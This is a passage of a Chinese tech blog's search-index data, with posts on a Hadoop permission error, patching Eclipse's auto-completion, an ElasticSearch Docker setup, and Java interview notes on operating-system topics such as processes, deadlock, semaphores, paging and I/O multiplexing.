org.apache.hadoop.fs.FileSystem; */Configuration conf = new Configuration(); conf.set(\"fs.defaultFS\", \"hdfs://192.168.88.137:9000\"); fs = FileSystem.get(new URI(\"hdfs://192.168.88.137:9000\"),conf,\"mini\"); 推荐第一、三种","path":"2019/04/11/eclipse开发Hadoop时异常org-apache-hadoop-security-AccessControlException/","date":"04-11","excerpt":"问题原因1org.apache.hadoop.security.AccessControlException: Permission denied: user=min, access=WRITE, inode=&quot;/access_log_copy&quot;:mini:supergroup:-rw-r--r--","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"eclipse","slug":"eclipse","permalink":"https://jijiking51.cn/tags/eclipse/"}],"preview":"http://img.jijiking51.cn/eclipse开发Hadoop时异常.jpg"},{"title":"eclipse设置自动补全并取消空格代码补全","text":"在网上找了很久但是都不尽人意，发现此篇文章，成功修改，借鉴一下，重要的不是修改那个文件，对于新版的eclipse关键是找到文件，如果你的没有，就去那个网址下一个吧设置代码提示打开 Eclipse 依次选择 Window -&gt; Perferences -&gt; Java -&gt; Editor -&gt; Content Assist，Auto activation triggers for Java：设置框中默认是”.” 现在将它改为： .abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ 有老版本的Eclipse不支持定义这么多触发器，可以通过修改配置文件实现，网上资料很多。 然后你就会发现Eclipse可以使用更智能的代码提示了。但是现在有一个比较大的问题是，Eclipse智能过头了，它总想帮我们完成一些我们不想要的代码补完。比如按“=”和空格以后就会自动补完代码，这对很多人真的不能忍。 幸好Eclipse是开源软件，解决办法是直接修改代码提示功能的源代码，以完成我们需要的功能。 首先打开window-&gt;show view，选择Plug-ins，再找到org.eclipse.jface.text，右键单击，选择import as－&gt; Source Project，导入完成后，在你的workspace就可以看到这个project了。如果没有src这个文件夹，说明你使用的版本中没有带源代码，我正好也是这种情况。 源代码可以去这个地址下载（找了我好久好久） http://archive.eclipse.org/eclipse/downloads/ 在页面上选择你Eclipse版本的连接（我使用的是4.4.2），然后在新页面中下载eclipse-SDK-(***).zip，根据自己的需要选择合适的版本下载，大概200M左右。下载完成以后解压缩，在.\\eclipse\\plugins\\文件夹下找到 org.eclipse.jface.text.source_3.9.2.v20141003-1326.jar （这是对应我使用的Eclipse版本的文件，实际请根据你自己的版本进行选择），将这个文件复制到你自己的Eclipse安装目录下的.\\eclipse\\plugins\\文件夹下，然后重新启动Eclipse。重复上面的操作导入(import)org.eclipse.jface.text，此时就能够看到src文件夹了。 技术分享 在src文件夹下org.eclipse.jface.text.contentassist.CompletionProposalPopup#verifyKey()”函数中有一段代码: if(contains(triggers, key)){…} 将这段代码改为 if(key!=0x20&amp;&amp; key!=‘=‘&amp;&amp; key!=‘;‘&amp;&amp; contains(triggers, key)){…} 还有把这段代码之上的代码 case‘\\t‘:e.doit=false;fProposalShell.setFocus();returnfalse; 修改为 case‘\\t‘:e.doit=false;insertSelectedProposalWithMask(e.stateMask);break; 经过上述操作，这个辅助输入插件已经排除了空格与“=”的选中功能，增加了TAB键的选中功能。最后就是导出修改后的插件，右键点击你的workspace里的工程，选择Export－&gt;Deployable plugins and fragments，点击Next，选择Destination选项卡，选择Directory，选择一个要保存插件的目录，然后Finish。然后就会在你所选的目录下产生一个新的plugins目录，里面有一个jar文件，用它替换掉eclipse/plugins里面的org.eclipse.jface.text，记得覆盖前对原文件进行备份。然后重新启动Eclipse","path":"2019/04/11/eclipse设置自动补全并取消空格代码补全/","date":"04-11","excerpt":"在网上找了很久但是都不尽人意，发现此篇文章，成功修改，借鉴一下，重要的不是修改那个文件，对于新版的eclipse关键是找到文件，如果你的没有，就去那个网址下一个吧设置代码提示打开 Eclipse 依次选择 Window -&gt; Perferences -&gt; Java -&gt; Editor -&gt; Content Assist，Auto activation triggers for Java：设置框中默认是”.”","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"eclipse","slug":"eclipse","permalink":"https://jijiking51.cn/tags/eclipse/"}],"preview":"http://img.jijiking51.cn/eclipse设置自动补全并取消空格代码补全.jpg"},{"title":"ElasticSearch使用记录","text":"首先执行（每次重启服务器后都需要执行）：sudo sysctl -w vm.max_map_count=262144获取一些基本配置文件12345docker run -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" -v /home/:/root/ --name elasticsearch elasticsearchdocker exec elasticsearch /bin/bash# 复制/usr/share/elasticsearch/下的config、logs两个文件夹内的文件分别到自己本地/home下的两个文件夹内，并且自己创建一个data文件夹# 复制完成后把三个文件夹放置到自己指定的目录下# 关闭容器并且删除！ 修改elasticsearch.yml配置文件，将cluster.name改成school 启动命令：12# -v指定的文件夹路径替换成上面的文件夹路径docker run -d -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" -v /home/h4795/Documents/studytmp/es/config/:/usr/share/elasticsearch/config/ -v /home/h4795/Documents/studytmp/es/logs/:/usr/share/elasticsearch/logs/ -v /home/h4795/Documents/studytmp/es/data/:/usr/share/elasticsearch/data/ --name elasticsearch elasticsearch 安装ik分词插件，ik分词器版本必须和es一致，否则一定会安装失败12345678# 分词器开源地址：https://github.com/medcl/elasticsearch-analysis-ikdocker exec elasticsearch /bin/bashcd binelasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.2.0/elasticsearch-analysis-ik-7.2.0.zip# 退出dockerexit# 重启esdocker restart elasticsearch 创建索引123456789101112// put http://127.0.0.1:9200/school&#123; \"settings\": &#123; \"number_of_shards\": \"5\", \"number_of_replicas\": \"1\", \"analysis\": &#123; \"ik\": &#123; \"tokenizer\": \"ik_max_word\" &#125; &#125; &#125;&#125; 建立字段123456789101112131415161718192021222324252627282930// post http://127.0.0.1:9200/school/_mapping/&#123; \"properties\": &#123; \"id\": &#123; \"type\": \"integer\" &#125;, \"title\": &#123; \"type\": \"text\" &#125;, \"context\": &#123; \"type\": \"text\" &#125;, \"createtime\": &#123; \"type\": \"date\", \"format\": \"yyyy-MM-dd HH:mm:ss || yyyy-MM-dd\" &#125;, \"status\": &#123; \"type\": \"integer\" &#125;, \"kind\": &#123; \"type\": \"integer\" &#125;, \"cid\": &#123; \"type\": \"integer\" &#125;, \"uid\": &#123; \"type\": \"integer\" &#125; &#125;&#125; 通过查询删除数据使用查找的方式,将查找的内容全部删除请求链接: 127.0.0.1:9200/noob/goods/_delete_by_query请求类型: POST请求数据:1234567&#123; \"query\": &#123; \"match\": &#123; \"goodsId\": \"47959547\" &#125; &#125;&#125;","path":"2019/04/11/ElasticSearch使用记录/","date":"04-11","excerpt":"首先执行（每次重启服务器后都需要执行）：sudo sysctl -w vm.max_map_count=262144获取一些基本配置文件12345docker run -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" -v /home/:/root/ --name elasticsearch elasticsearchdocker exec elasticsearch /bin/bash# 复制/usr/share/elasticsearch/下的config、logs两个文件夹内的文件分别到自己本地/home下的两个文件夹内，并且自己创建一个data文件夹# 复制完成后把三个文件夹放置到自己指定的目录下# 关闭容器并且删除！","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"配置","slug":"配置","permalink":"https://jijiking51.cn/tags/配置/"}],"preview":"http://img.jijiking51.cn/ElasticSearch使用记录.jpg"},{"title":"Java面试_操作系统","text":"线程与进程线程与进程理论 进程和线程以及他们的区别 进程：一个程序在一个数据集上的一次运行过程。系统资源分配的单位。 一个程序在不同数据集合上运行或一个程序在同样数据集上的多次运行都是不同的进程。 进程是独立的，有自己的内存空间和上下文环境，无法获取其他进程的存储空间。同一进程的两段代码不能同时执行，除非引入线程。 线程：进程的一个实体，是被系统独立调度和执行的基本单位，CPU使用的基本单位。 同一进程的线程可以共享同一内存空间。线程是属于进程的，当进程退出时该进程所产生的线程都会被强制退出并清除。线程占用的资源少于进程占用的资源 进程和线程都可以有优先级 进程在内存中的结构 代码区：存放CPU执行的机器指令，代码区是可共享，并且是只读的 数据段：全局变量、静态变量、常量（编译后知道大小）（未初始化的在一个区域(BBS区)，初始化的在相邻区域(数据区)） 全局变量：定义在函数外面，其他文件也能使用（external linkage） 静态变量：static 关键字修饰的变量： 函数外定义：全局变量，只在当前文件中可见（ internal linkage） 函数内定义：全局变量，只在此函数内可见 （C++）类中定义：全局变量，只在此类中可见 栈区：由编译器自动分配释放，存放函数的参数值、返回值和局部变量，在程序运行过程中实时分配和释放，栈区由操作系统自动管理，无须程序员手动管理 堆区：堆是由malloc()函数分配的内存块，使用free()函数来释放内存，堆的申请释放工作由程序员控制，容易产生内存泄漏 进程地址空间：内核地址空间+用户地址空间（代码段、数据段、堆、栈、共享库） 堆和栈的区别 栈：函数参数、返回地址、局部变量（运行入口知道大小） 编译器自动分配释放，存放函数的参数值，局部变量的值等。 申请后的响应：若栈的剩余空间大于申请空间，系统将为程序提供内存，否则提示栈溢出 大小限制：向低地址扩展，连续的内存区域，栈顶地址和栈最大容量是系统事先规定好的。如果申请的空间超过栈的剩余空间将栈溢出 申请效率：系统自动分配，速度快，程序员无法控制 存储的内容：函数调用时进栈顺序：主函数下一条指令的地址（函数调用语句的下一条可执行语句）、函数的各个参数（大多数c编译器中参数是从右往左入栈）、函数的局部变量。 调用结束的出栈顺序：局部变量、函数参数（从左到右）、栈顶指针指向最开始存的地址（即主函数的下一条指令） 堆：运行期间动态分配的内存空间（运行的时候才知道大小） 程序员自己分配释放，分配方式类似于链表 申请后的响应：操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时会遍历该链表，寻找第一个空间大于所申请空间的堆结点，将该结点从空闲结点链表删除，分配该结点的空间给程序。会在这块内存空间中的首地址处记录本次分配的大小。 这样delete语句才能正确释放本内存空间。由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动将多余的那部分重新放入空闲链表中 大小限制：向高地址扩展，不连续的内存区域，用链表存储，遍历方向是由低地址向高地址。堆大小受限于计算机系统的有效虚拟内存。获得的空间更大更灵活 申请效率：用new分配，速度慢，容易产生内部碎片，使用方便 存储的内容：一般在堆的头部用一个字节放堆的大小 进程状态 创建（信息设置完但资源有限） 运行（占用cpu） 就绪（等待分配cpu） 等待（等待某个是啊金的发送） 终止（进程完成执行） 进程间的通信如何实现 通信的方式有：信号、信号量、消息队列、共享内存、管道、有名管道 管道(pipe)：半双工通信，数据单向流动；只能父子进程通信；速度慢 有名管道(FIFO)：任何进程都能通信；速度慢 信号量（semophore）：计数器，控制多个进程对共享资源的访问（多进程或线程的同步方法）；不能传递复杂消息 信号：用于通知接收进程某个事件已经发送 消息队列：消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递少、管道只能承载无格式字节流以及缓冲区大小受限的缺点；容量受限，第一次读的时候要考虑上一次没有读完数据的问题 需要消息复制，不需考虑同步问题，不适宜信息量大或操作频繁的场合 共享内存：映射一段能被其他进程访问的内存，由一个进程创建，可被多个进程访问，要保持同步。与信号量结合使用，用来达到进程间的同步及互斥，最快的IPC方式 不需要消息复制，信息量大，快捷，在任意数量的进程之间进行高效双向通信的机制。 套接字：可用于不同机器间的进程通信，由ip地址和端口号连接而成 进程调度 选择一个可用的进程到cpu上执行 进程进入系统，会被加入到作业队列（包括系统的所有进程）队列通常用链表实现，头结点指向的链表的第一个和最后一个pcb块的指针，每个pcb包括一个指向就绪队列的下一个pcb的指针域 运行—&gt;就绪：IO请求（–&gt;IO队列–&gt;IO结束）；时间片结束；创建一个子进程（等待子进程结束）；等待中断（中断发生） PCB： 进程标志 进程状态 程序计数器 寄存器 cpu调度信息：进程优先级、调度队列指针、其他调度参数 内存管理信息：基址寄存器 界限寄存器 页表/段表 记账信息：cpu时间、实际使用时间、时间界限、记账数据、作业或进程数量 I/O状态信息：分配给进程的IO设备列表、打开文件列表 线程状态 创建(new)、就绪(runnable/start)、运行(running)、阻塞(blocked)、等待(waiting)、时间等待(time waiting) 和 消亡(dead/terminated)。在给定的时间点上，一个线程只能处于一种状态 线程同步的方式 互斥量 Synchronized/Lock：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问 信号量 Semphare：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量 事件(信号)，Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作 处理机调度 先来先服务（FCFS，First-Come-First-Served）: 此算法的原则是按照作业到达后备作业队列（或进程进入就绪队列）的先后次序来选择作业（或进程）。 短作业优先（SJF,Shortest Process Next）：这种调度算法主要用于作业调度，它从作业后备队列中挑选所需运行时间（估计值）最短的作业进入主存运行。 时间片轮转调度算法（RR，Round-Robin）：当某个进程执行的时间片用完时，调度程序便停止该进程的执行，并将它送就绪队列的末尾，等待分配下一时间片再执行。然后把处理机分配给就绪队列中新的队首进程，同时也让它执行一个时间片。这样就可以保证就绪队列中的所有进程，在一给定的时间内，均能获得一时间片处理机执行时间。 高响应比优先（HRRN，Highest Response Ratio Next）: 按照高响应比（（已等待时间＋要求运行时间）/ 要求运行时间）优先的原则，在每次选择作业投入运行时，先计算此时后备作业队列中每个作业的响应比RP然后选择其值最大的作业投入运行。 优先权(Priority)调度算法: 按照进程的优先权大小来调度，使高优先权进程得到优先处理的调度策略称为优先权调度算法。 多级队列调度算法：多队列调度是根据作业的性质和类型的不同，将就绪队列再分为若干个子队列，所有的作业（或进程）按其性质排入相应的队列中，而不同的就绪队列采用不同的调度算法。 说一说进程同步有哪几种机制 原子操作、信号量机制、自旋锁管程、会合、分布式系统 中断和轮询的特点 对I/O设备的程序轮询的方式，是早期的计算机系统对I/O设备的一种管理方式。它定时对各种设备轮流询问一遍有无处理要求。轮流询问之后，有要求的，则加以处理。在处理I/O设备的要求之后，处理机返回继续工作。尽管轮询需要时间，但轮询要比I/O设备的速度要快得多，所以一般不会发生不能及时处理的问题。当然，再快的处理机，能处理的输入输出设备的数量也是有一定限度的。而且，程序轮询毕竟占据了CPU相当一部分处理时间，因此，程序轮询是一种效率较低的方式，在现代计算机系统中已很少应用。 程序中断通常简称中断，是指CPU在正常运行程序的过程中，由于预先安排或发生了各种随机的内部或外部事件，使CPU中断正在运行的程序，而转到为响应的服务程序去处理。 轮询——效率低，等待时间很长，CPU利用率不高。 中断——容易遗漏一些问题，CPU利用率高。 同步和互斥 同步是进程之间合作完成某功能，是进程之间的直接关系 互斥是多个进程公用某临界资源，是进程之间的间接关系 (互斥是不允许两个线程同时占有一个资源。同步是在互斥的基础上，再加了访问次序，比如生产消费者模式，需要先生成在消费。比如希尔排序，需要大的间隔度排序完，才能排步数小的） 经典同步问题， 生产消费者模式（Java多线程中也有） 线程&amp;锁 什么是死锁？ 死锁产生的条件？ 死锁的概念 在两个或者多个并发进程中，如果每个进程持有某种资源而又等待其它进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗的讲，就是两个或多个进程无限期的阻塞、相互等待的一种状态。 死锁产生的四个必要条件 互斥：至少有一个资源必须属于非共享模式，即一次只能被一个进程使用；若其他申请使用该资源，那么申请进程必须等到该资源被释放为止； 占有并等待：一个进程必须占有至少一个资源，并等待另一个资源，而该资源为其他进程所占有； 非抢占：进程不能被抢占，即资源只能被进程在完成任务后自愿释放 循环等待：若干进程之间形成一种头尾相接的环形等待资源关系 死锁的处理策略；鸵鸟策略、预防策略、避免策略、检测与恢复策略 死锁预防 打破互斥条件。即允许进程同时访问某些资源。但是有的资源是不允许被同时访问的。像打印机等等，这是有资源本身的属性所决定的。所以这种办法并无实用价值 打破不可抢占条件。即允许进程强行从占有者那里多去某些资源。就是说，当一个进程已占有了某些资源，他又申请新的资源，但不能立即被满足时，它必须释放所有占有的全部资源，然后再重新申请。它所释放的资源可以分配给其他进程。这就相当于该进程占有的资源被隐蔽地强占了，这种预防死锁的方法实现起来困难，会减低系统性能。 打破占有且申请条件。可以实行资源与预先分配策略。即进程在运行前一次性的向系统申请他所需要的全部资源，如果某个进程所需要的全部资源得不到满足，则不分配资源，此进程暂不运行。只有当系统能够满足当前进程的全部资源需求时，才一次性的将所申请的资源全部分配给该进。由于运行的进程已占有了它所需要的全部资源，所以不会发生占有资源又申请资源的现象，因此不会发生死锁。但是这种策略也有如下缺点 在许多情况下，一个进程在执行之前不可能知道他所需要的全部资源。这是由于进程在执行时是动态的，不可预测的； 资源利用率低。无论所分配资源和使用到，一个进程只有在占有所需要的全部资源后才能执行。即使有些资源做后才被该进程用到一次，但该进程在生存期间却一直占有他们，造成长期占着不用的状况。这显然是一种极大的资源浪费 降低了进程的并发性。因为资源有限，又加上存在浪费，能分配到所需全部资源的进程个数就必然少了 打破循环等待条件，实行资源有序分配策略。采用这种策略，即把资源实现分类编号，按号分配，使进程在申请，占用资源时不会形成环路。所有进程对资源的请求必须严格按资源序号递增的顺序提出。进程占用了小号资源，才能申请大号资源，就不会产生环路，从而预防了死锁。这种策略与前面的策略相比，资源的利用率额系统吞吐量都有很大提高，但是也存在以下缺点： 限制了进程对资源的请求，同时给系统中所有资源合理编号也是件困难事，并增加了系统开销 为了遵循按编号申请的次序，暂不使用的资源也需要提前申请，从而增加了进程对资源的占用时间 线程如何避免死锁 固定加锁的顺序(针对锁顺序死锁) 开放调用(针对对象之间协作造成的死锁) 在一个锁内尽量不要调用其他带锁的方法 使用定时锁–&gt;tryLock() 如果等待获取锁时间超时，则抛出异常而不是一直等待！ 银行家算法 如何理解分布式锁 分布式锁，是控制分布式系统之间同步访问共享资源的一种方式。在分布式系统中，常常需要协调它们的动作。如果不同的系统或是同一个系统的不同主机之间共享了一个或一组资源，那么访问这些资源的时候，往往需要不出来防止彼此干扰来保证一致性，在这种情况下，便需要使用分布式锁 临界区问题 【共享数据的互斥】 临界区：在该区中进程可能改变共同变量、更新一个表、写一个文件；没有两个进程能同时在临界区内执行。 123456do &#123; 【进入区】 // 请求允许进入其临界区 临界区 【退出区】 剩余区 &#125; while (true); eg. Peterson算法 123456789101112131415int turn; // 表示哪个进程可以进入临界区boolean flag[2]; // 表示哪个进程想要进入临界区 // Pi进程的结构------------------------------- do &#123; // 进入区 flag[i] = true; turn = j; while (flag[i] &amp;&amp; turn == j); // 临界区 flag[i] = false; // Pi最多在Pj进入临界区一次后就能进入---有限等待 // 剩余区&#125; while (true); 满足3个要求： 互斥（进程在临界区内执行，其他进程就不能在其临界区内执行） 前进（如果没有进程在其临界区执行且有进程需进入临界区，那么只有那些不在剩余区内执行的进程可参加选择，以确定谁能下一个进入临界区，且这种不能无线） 有限等待：从一个进程请求允许进入临界区到进入临界区为止，其他进程允许进入其临界区的次数有限 信号量 信号量S是一个整数型变量，信号量分为计数信号量（初始化为可用资源的数量）和二进制信号量（互斥锁）。 除了初始化外，只能通过两个标准【原子】操作：wait()和signal()来访问（这些操作被成为P测试和V增加） 123456789// 进程需要资源的时候 wait(S) &#123; while (S &lt;= 0); // 被阻塞----忙等待 S--; &#125; // 进程释放资源的时候 signal(S) &#123; S++; &#125; 这里定义的信号量【自旋锁】的主要缺点： 忙等待：当一个进程位于其临界区内时，其他试图进入临界区的进程需要在进入区连续第循环，浪费了cpu时钟 优点：进程在等待锁时不需要上下文切换，节省时间（如果锁占用时间短） 克服忙等：进程信号量不为正时不忙等二十阻塞自己，放入一个与信号量相关的等待队列中，状态为等待。 线程同步与阻塞的关系？同步一定阻塞吗？阻塞一定同步吗？ 线程同步与阻塞没有一点关系 同步和异步关注的是消息通信机制(synchronous communication / asynchronous communication)。所谓同步，就是在发出一个调用时，在没有得到结果之前，这个调用就不返回。但是一旦调用返回，就得到返回值了。换句话说，就是由调用者主动等待这个调用的结果。而异步则是相反，调用在发出之后这个调用就直接返回了，所以没有返回结果。换句话说，当一个异步过程调用发出后，调用者不会立即得到结果。而是在调用发出后，被调用者通过状态、通知来通知调用者，或通过回调函数处理这个调用。 阻塞和非阻塞关注的是程序在等待调用结果(消息、返回值)时的状态。阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。非阻塞调用指在不能立即得到结果之前，该调用不会阻塞当前线程 储存器管理 什么是缓冲区溢出？有什么危害？其原因是什么？ 缓冲区溢出是指计算机向缓冲区填充数据的时候超过了缓冲区本身的容量，溢出的数据覆盖在了合法数据上； 危害有以下两点： 程序崩溃，导致拒绝额服务 跳转并且执行一段恶意代码 造成缓冲区溢出的主要原因就是程序中没有检查用户输入的参数 分页和分段有什么区别 段式存储管理是一种符合用户视角的内存分配管理方案。在段式存储管理中，将程序的地址空间划分为若干段（segment），如代码段，数据段，堆栈段；这样每个进程有一个二维地址空间，相互独立，互不干扰。段式管理的优点是：没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片） 页式存储管理方案是一种用户视角内存与物理内存相分离的内存分配管理方案。在页式存储管理中，将程序的逻辑地址划分为固定大小的页（page），而物理内存划分为同样大小的帧，程序加载时，可以将任意一页放入内存中任意一个帧，这些帧不必连续，从而实现了离散分离。页式存储管理的优点是：没有外碎片（因为页的大小固定），但会产生内碎片（一个页可能填充不满）。 两者的不同点： 目的不同：分页是由于系统管理的需要而不是用户的需要，它是信息的物理单位；分段的目的是为了能更好地满足用户的需要，它是信息的逻辑单位，它含有一组其意义相对完整的信息； 大小不同：页的大小固定且由系统决定，而段的长度却不固定，由其所完成的功能决定； 地址空间不同： 段向用户提供二维地址空间；页向用户提供的是一维地址空间； 信息共享：段是信息的逻辑单位，便于存储保护和信息的共享，页的保护和共享受到限制； 内存碎片：页式存储管理的优点是没有外碎片（因为页的大小固定），但会产生内碎片（一个页可能填充不满）；而段式管理的优点是没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片）。 什么是虚拟内存 虚拟内存允许执行进程不必完全在内存中。虚拟内存的基本思想是：每个进程拥有独立的地址空间，这个空间被分为大小相等的多个块，称为页(Page)，每个页都是一段连续的地址。这些页被映射到物理内存，但并不是所有的页都必须在内存中才能运行程序。当程序引用到一部分在物理内存中的地址空间时，由硬件立刻进行必要的映射；当程序引用到一部分不在物理内存中的地址空间时，由操作系统负责将缺失的部分装入物理内存并重新执行失败的命令。这样，对于进程而言，逻辑上似乎有很大的内存空间，实际上其中一部分对应物理内存上的一块(称为帧，通常页和帧大小相等)，还有一些没加载在内存中的对应在硬盘上 注意，请求分页系统、请求分段系统和请求段页式系统都是针对虚拟内存的，通过请求实现内存与外存的信息置换。 虚拟内存的应用与优点 虚拟内存很适合在多道程序设计系统中使用，许多程序的片段同时保存在内存中。当一个程序等待它的一部分读入内存时，可以把CPU交给另一个进程使用。虚拟内存的使用可以带来以下好处： 在内存中可以保留多个进程，系统并发度提高 解除了用户与内存之间的紧密约束，进程可以比内存的全部空间还大 页面置换算法有哪些 最佳置换算法（Optimal）：即选择那些永不使用的，或者是在最长时间内不再被访问的页面置换出去。（它是一种理想化的算法，性能最好，但在实际上难于实现）。 先进先出置换算法FIFO：该算法总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面予以淘汰。 最近最久未使用置换算法LRU（Least Recently Used）：该算法是选择最近最久未使用的页面予以淘汰，系统在每个页面设置一个访问字段，用以记录这个页面自上次被访问以来所经历的时间T，当要淘汰一个页面时，选择T最大的页面。 Clock置换算法：也叫最近未用算法NRU（Not RecentlyUsed）。该算法为每个页面设置一位访问位，将内存中的所有页面都通过链接指针链成一个循环队列。当某页被访问时，其访问位置“1”。在选择一页淘汰时，就检查其访问位，如果是“0”，就选择该页换出；若为“1”，则重新置为“0”，暂不换出该页，在循环队列中检查下一个页面，直到访问位为“0”的页面为止。由于该算法只有一位访问位，只能用它表示该页是否已经使用过，而置换时是将未使用过的页面换出去，所以把该算法称为最近未用算法。 最少使用置换算法LFU：该算法选择最近时期使用最少的页面作为淘汰页。 颠簸/抖动 ​ 颠簸本质上是指频繁的页调度行为，具体来讲，进程发生缺页中断，这时，必须置换某一页。然而，其他所有的页都在使用，它置换一个页，但又立刻再次需要这个页。因此，会不断产生缺页中断，导致整个系统的效率急剧下降，这种现象称为颠簸（抖动）。 内存颠簸的解决策略包括： 如果是因为页面替换策略失误，可以修改替换算法来解决这个问题； 如果是因为运行的程序太多，造成程序无法同时将所有频繁访问的页面调入内存，则要降低多道程序的数量； 否则，还剩下两个办法：终止该进程或增加物理内存容量。 局部性原理 时间上的局部性：最近被访问的页在不久的将来还会被访问。 空间上的局部性：内存中被访问的页周围的页也很可能被访问。 CPU中的缓存和操作系统中的缓存分别是什么？ ​ 操作系统的缓存是指快表。在操作系统中，为提高系统的存取速度，在地址映射机制中增加一个小容量的联想寄存器，即快表，用来存放当前访问最频繁的少数活动页面的页号。当某用户需要存取数据时，根据数据所在的逻辑页号在快表中找到其对应的内存块号，再联系页内地址，形成物理地址。如果在快表中没有相应的逻辑页号，则地址映射仍可以通过内存中的页表进行，得到空闲块号后必须将该块号填入快表的空闲块中。如果快表中没有空闲块，则根据淘汰算法淘汰某一行，再填入新的页号和块号。快表查找内存块的物理地址消耗的时间大大降低了，使得系统效率得到了极大的提高。 ​ CPU中的缓存是指高速缓存。CPU的执行速度越来越快，系统架构越来越先进，而主存的结构和存取速度改进则较慢，因此，高速缓存技术将越来越重要。 高速缓冲存储器是位于CPU和内存之间的临时存储器，它的容量比内存小但交换速度快。在高速缓冲存储器中的数据是内存中的一小部分，但这一小部分是短时间内CPU即将访问的。当CPU调用大量数据时，就可避开内存直接从高速缓冲存储器中调用，从而加快读取速度。 存储器管理 存储器多层结构：寄存器，高速缓存，主存，磁盘程序装入与链接 分配方式：连续分配和离散分配 顺序动态分配： 首次适应 循环首次适应 最佳适应（找到刚好合适的） 最坏适应（每次找到最大的） 动态重定位分配： 紧凑法： 将碎片合并成大的空间， 但是影响系统效率 离散分配：分页，分段 分页：是物理大小，由系统决定，页面大小是固定的 分段： 大小是逻辑，用户决定的，段的大小是动态的 分页：页表存储在内存中，cpu先访问页表，再从页表中得到页号得到的物理地址，其中cpu访问两次内存，速度会明显变慢。通常会用高速缓存（“快表”），缓存当前访问到的页号对应的物理页面，如果没有命中，再去内存中访问页表。 分段： 方便编程，信息共享，信息保护，动态增长，动态链接 段页式：段表寄存器记录了段表的大小和起始地址，段表中的每条信息记录了段内页面的页表和起始地址，根据页表可以找到每个页面的位置。 段表=&gt;页表=&gt;最终页面 三次访问内存， 实际会设置高速寄存器，根据段号和页号，查看是否在缓存中命中 I/O管理一.操作系统与设备之间的IO简单来说（详细的请看《现代操作系统》），操作系统通过设备驱动程序访问IO设备。方式有： 轮询方式： CPU主动在各种设备中轮询检查状态，有数据就IO。 中断方式： 设备有数据的时候，发出中断，由CPU决定要不要响应中断，然后中断，去处理设备的IO。CPU不用经常轮询设备状态。被动接收中断就行。 DMA直接存储器访问方式： 如果1个字节的数据中断一次，传1KB的数据得中断1024次，太浪费CPU时间，于是有了DMA方式，CPU只需要把开头和结束的地址告诉DMA，中间由DMA完成数据IO。CPU从字节干预解放到数据块的干预。 通道控制方式： DMA方式只能控制一个设备的一块数据，多块数据还是要CPU干预多次。于是有了通道来控制IO，它比DMA更强大，能控制多块数据，多个设备的IO，更加解放了CPU参与IO过程。 二.操作系统与用户进程间的IO（进程中的线程才是CPU基本的执行/调度单元，下面用线程举例，用socket举例） 设备来的数据放在内核cache中，需要用户线程去内核cache中取数据，复制到自己进程的cache中。有5中读取数据方式： 阻塞： 用户线程调用某些系统函数去内核取数据，直到数据到达内核cache前，该线程处于阻塞状态，等待数据到达。 非阻塞 用户线程去取数据，不管内核cache有没有数据，都直接返回，可能拿到数据，也可能拿不到，不会使线程进入阻塞态。 IO多路复用 多路就是一个线程管理多路IO，线程还是被阻塞调用，其中一路或几路IO有数据了就返回。需要线程遍历全部IO，判断是哪个IO有数据。 例如 socket 的 select() 函数，线程调用 select() 进入阻塞态，任何一个IO有数据了，线程就退出阻塞态，获得机会继续执行。 信号驱动IO 给一个IO注册一个信号和信号触发的回调函数，一旦信号被触发，回调函数里读取数据。 例如给 socket 注册一个“可读”的信号，当数据来了，可读的时候，信号被触发，执行回调函数从内核cache复制数据到用户空间。 异步IO 异步IO中，操作系统完成了数据从内核到用户空间的拷贝后，以信号的方式通知用户线程可以下一步操作。省去了用户线程阻塞下来拷贝数据的过程。 IO管理假设一台服务器需要被1万个客户端连接。方法有： 单路： 最简单的一个线程管理一个客户端的socket IO，那么需要1万的线程，假设每个线程占内存3MB，需要300G内存，单台服务器没那么大的内存，并且操作系统最大线程数有限制，unix下一个进程好像是最多只能开 4096 个线程。 IO 多路复用： socket一旦多起来，单路IO 就扛不住了，需要一个线程管理多个 socket IO，下面都是在一个线程内的情况。 select 一个线程管理多个socket IO，调用 select() 进入阻塞态，任何一个IO有数据则返回，由于不知道是哪个 socket 有数据，需要遍历所有 socket fd 去判断，当1万个 socket 大部分都是有IO的时候，效率较高，如果只是那么几百个有IO，此方法效率较低。 epoll 和 kqueue epoll 是 linux 下的，kqueue 是 unix 下的。 由于 select 需要遍历全部的 socket fd，效率较低，于是有了 epoll, kqueue 方式，kqueue 管理多个IO，阻塞调用等待函数，当有一个或多个IO事件，kqueue 直接返回多个IO事件的 socket fd，不需要遍历全部 socket fd，效率较高。 假设一个 socket 连接的对象是 3 kb，8G的内存可以管理 280w 个连接。 select，epoll，kqueue 原理 已知的情况 内核中注册 socket 的 IO 中断处理的回掉函数，有 IO 了会回调该函数。 select： select 管理多个 socket，select 收到一个来自网卡 IO 中断就返回，不知道这个中断对应是哪个 socket fd 的。需要用户线程遍历判断。 epoll： epoll 收到一个 IO 中断，会去查找这个中断对应哪个 socket fd。 epoll 中建立一个红黑树（平衡二叉树的一种），红黑树查找很高效。 